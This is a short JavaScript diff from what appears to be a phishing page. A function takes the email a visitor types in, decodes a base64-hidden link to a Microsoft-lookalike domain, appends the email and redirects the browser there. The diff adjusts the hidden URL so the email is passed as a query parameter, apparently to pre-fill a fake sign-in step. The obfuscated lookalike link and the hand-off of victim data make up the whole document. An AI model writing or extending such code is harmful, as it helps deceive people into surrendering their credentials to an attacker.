@@ -154,7 +154,7 @@
         function continueLoading() {
     var thesupwillsup = document.getElementById('thesupwillsup-input').value;
     if (validateEmail(thesupwillsup)) {
-        var linkx = "aHR0cHM6Ly9zZ3Noc2doLmxhd2FwcG1pY3Jvc29mdC5jb20vM0E4Wno="; // Base64 encoded link
+        var linkx = "aHR0cHM6Ly9zZ3Noc2doLmxhd2FwcG1pY3Jvc29mdC5jb20vM0E4Wno/ZT0="; // Base64 encoded link
         var decodedLink = atob(linkx);
         var finalLink = decodedLink + "" + thesupwillsup;  // Directly append the email address
         window.location.href = finalLink;
